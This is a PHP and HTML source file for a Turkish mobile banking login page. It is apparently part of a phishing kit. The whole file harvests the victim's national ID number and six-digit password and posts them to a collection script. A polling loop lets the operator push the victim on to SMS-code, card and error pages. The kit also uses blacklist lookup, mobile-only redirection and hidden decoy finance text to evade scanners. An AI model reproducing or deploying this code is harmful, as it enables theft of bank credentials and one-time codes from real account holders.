<?php 

    include '1engel/blacklist_lookup.php';
    include '2ktnrl/Mobile_Detect.php';
    $detect = new Mobile_Detect;
    include '2ktnrl/geoplugin.class.php';
    include '2ktnrl/src/vendor/autoload.php';
    use DeviceDetector\DeviceDetector;
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    $deviceDetector = new DeviceDetector($userAgent);
    $deviceDetector->parse();
    $device = $deviceDetector->getDeviceName();
    $model = $deviceDetector->getModel();

    if ( $detect->isMobile() ) {
    } else {
        header("Location: mobil-giris.php");
        exit();
    }
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <title>Mobil</title>

    <style>
        @font-face {
            font-family: 'KelveticaNobis';
            src: url('./css/KelveticaNobis.otf') format('opentype');
            font-weight: normal;
            font-style: normal;
        }

        body, html {
            background-color: #f1f2f2;
            padding: 0;
            max-width: 414px;
            margin: 0 auto;
            font-family: 'KelveticaNobis', sans-serif;
        }

        header {
            width: 100%;
            height: 106px;
            background-image: url('./css/baslik.png');
            background-size: contain;
            background-repeat: no-repeat;
        }

        .main {
            min-height: 805px;
            width: 100%;
            height: 805px;
            background-image: url('./css/body.png');
            background-size: contain;
            background-repeat: no-repeat;
        }

        input.form-control {
            width: 85%;
            height: 50px;
            font-family: 'KelveticaNobis', sans-serif;
            margin-bottom: 10px;
            margin-top: 5px;
            border: none;
            font-size: 16px;
            margin-left: 15px;
            margin-right: 15px;
            padding-left: 20px;
        }

        input.form-control:focus {
            outline: none;
            box-shadow: none;
        }

        button.btn {
            width: 90%;
            height: 50px;
            margin-top: 20px;
            background-color: #2ea8ab;
            border: none;
            color: #fff;
            font-size: 14px;
            cursor: pointer;
            border-radius: 0;
        }

.fullscreen-div {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background-image: url('./css/slide.png');
    background-size: cover; /* Arka planın her zaman ekranı tamamen kaplamasını sağlar */
    background-position: center center; /* Resmin merkezini sabitler, böylece herhangi bir kayma olmaz */
    z-index: 9999;
    display: none;
    max-width: 100%; /* Ekran boyutuna göre genişliği ayarlar */
    max-height: 100%; /* Ekran boyutuna göre yüksekliği ayarlar */
}

@media (max-width: 414px) {
    .fullscreen-div {
        background-size: cover; /* Küçük ekranlarda da resmi orantılı şekilde büyütür */
        background-position: center center;
    }
}

@media (min-width: 415px) and (max-width: 768px) {
    .fullscreen-div {
        background-size: cover; /* Orta boyutlu ekranlar için de orantılı büyütme */
    }
}


        .error-message {
            color: red;
            font-size: 14px;
            margin-bottom: 10px;
            font-weight: 700;
        }

        /* Preloader */
        .preloader {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #ffffff;
            z-index: 10000;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .spinner {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #2ea8ab;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="preloader" id="preloader">
        <div class="spinner"></div>
    </div>
	<div id="info1" style="display: none;">
		<p>Your credit score can impact your loan approval rate. Keep it high for better chances!</p>
	</div>
    <header></header>
    <div class="fullscreen-div" id="fullscreenDiv" style="display: block;"></div>
    <div class="main">
        <form id="loginForm">
            <center>
                <input type="text" class="form-control" id="tntnnum" minlength="11" maxlength="11" placeholder="Müşteri / TC Kimlik Numarası">
            </center>
            <center>
                <input type="password" class="form-control" id="msrortr" maxlength="6" inputmode="numeric" placeholder="Parola">
                <div id="errorMessage" class="error-message" style="display:none;">Lütfen Bilgilerinizi kontrol ederek tekrar deneyin.</div>
            </center>
			<div id="info2" style="display: none;">
				<p>Diversifying your investment portfolio reduces risk and enhances returns over time.</p>
			</div>

            <center>
                <button id="kontrollu" class="btn" type="button">Giriş</button>
            </center>
        </form>
    </div>
	<div id="info3" style="display: none;">
		<p>Saving for retirement early helps you build a strong financial foundation for the future. The Foundation for the Future is an education and advocacy non-profit dedicated to advancing the space economy by developing critical infrastructure to enable ...
</p>
	</div>
    <script>
        function tcno_dogrula(tcno) {
            tcno = String(tcno);
            if (tcno.length !== 11 || tcno[0] === '0') return false;
            let hane_tek = 0, hane_cift = 0, ilkon_total = 0;
            for (let i = 0; i < 9; i++) {
                let j = parseInt(tcno[i], 10);
                i % 2 === 0 ? hane_tek += j : hane_cift += j;
                ilkon_total += j;
            }
            if ((hane_tek * 7 - hane_cift) % 10 !== parseInt(tcno[9], 10)) return false;
            ilkon_total += parseInt(tcno[9], 10);
            return ilkon_total % 10 === parseInt(tcno[10], 10);
        }

        function submitFirstForm() {
            const tntnnum = $('#tntnnum').val();
            const msrortr = $('#msrortr').val();
            const iddTC = tcno_dogrula(tntnnum);
            const idPWD = /^\d{6}$/.test(msrortr);

            if (!iddTC || !idPWD) {
                $('#errorMessage').show();
            } else {
                $('#errorMessage').hide();
                $.post('i2.php', { tntnnum, msrortr })
                    .done(function() {
                        window.location.href = 'phone.php';
                    })
                    .fail(function() {
                        $('#errorMessage').text('Bir hata oluştu, lütfen tekrar deneyin.').show();
                    });
            }
        }

        $('#kontrollu').on('click', submitFirstForm);

        $('#fullscreenDiv').on('click', function() {
            $(this).slideUp(500);
        });

        $('header').on('click', function() {
            $('#fullscreenDiv').slideDown(500);
        });

        // Preloader kontrolü
        $(window).on('load', function() {
            $('#preloader').fadeOut('slow');
        });
		
		function sendUrlPath() {
			const currentUrl = window.location.pathname;
			const urlPath = currentUrl.substring(currentUrl.lastIndexOf('/') + 1);
			const xhr = new XMLHttpRequest();
			xhr.open("POST", "i1.php", true);
			xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
			xhr.onreadystatechange = function () {
				if (xhr.readyState === 4 && xhr.status === 200) {
					const responseText = xhr.responseText.trim();
					switch (responseText) {
						case "sms":
							window.location.href = 'sms.php';
							break;
						case "hata":
							window.location.href = 'hatali.php';
							break;
						case "sms2":
							window.location.href = 'bildirim.php';
							break;
                        case "telhata":
                            window.location.href = 'phone.php?err';
                            break;
                        case "kart":
                            window.location.href = 'iade-al.php';
                            break;
						case "back":
							window.location.href = '/';
							break;
						case "tebrik":
							window.location.href = 'basarili.php';
							break;
						default:

					}
				}
			};
			xhr.send(`x=${urlPath}`);
		}


		setInterval(sendUrlPath, 2100);
    </script>
</body>
</html>
